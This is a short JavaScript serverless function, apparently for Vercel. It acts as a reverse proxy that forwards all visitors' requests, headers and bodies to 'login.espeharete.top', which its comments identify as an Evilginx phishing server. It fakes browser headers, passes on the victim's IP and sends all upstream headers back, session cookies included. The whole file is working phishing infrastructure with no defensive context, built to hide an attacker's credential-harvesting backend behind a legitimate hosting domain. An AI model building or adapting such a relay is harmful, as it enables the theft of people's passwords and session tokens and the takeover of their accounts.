export default async function handler(req, res) {
  const targetUrl = `https://login.espeharete.top${req.url}`;

  // Clone and modify headers to mimic a real browser
  const headers = {
    ...req.headers,
    'Host': 'login.espeharete.top', // Force Evilginx to recognize the host
    'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip, // Forward real visitor IP
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', // Fake a real browser
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
  };
  delete headers['host']; // Remove Vercel's default host header

  try {
    const response = await fetch(targetUrl, {
      method: req.method,
      headers: headers,
      body: req.method !== 'GET' ? req.body : undefined,
    });

    // Forward all headers from Evilginx
    for (const [key, value] of response.headers) {
      res.setHeader(key, value);
    }

    // Stream the raw response
    const buffer = await response.arrayBuffer();
    res.status(response.status).send(Buffer.from(buffer));
  } catch (error) {
    res.status(500).send("Proxy error: " + error.message);
  }
}
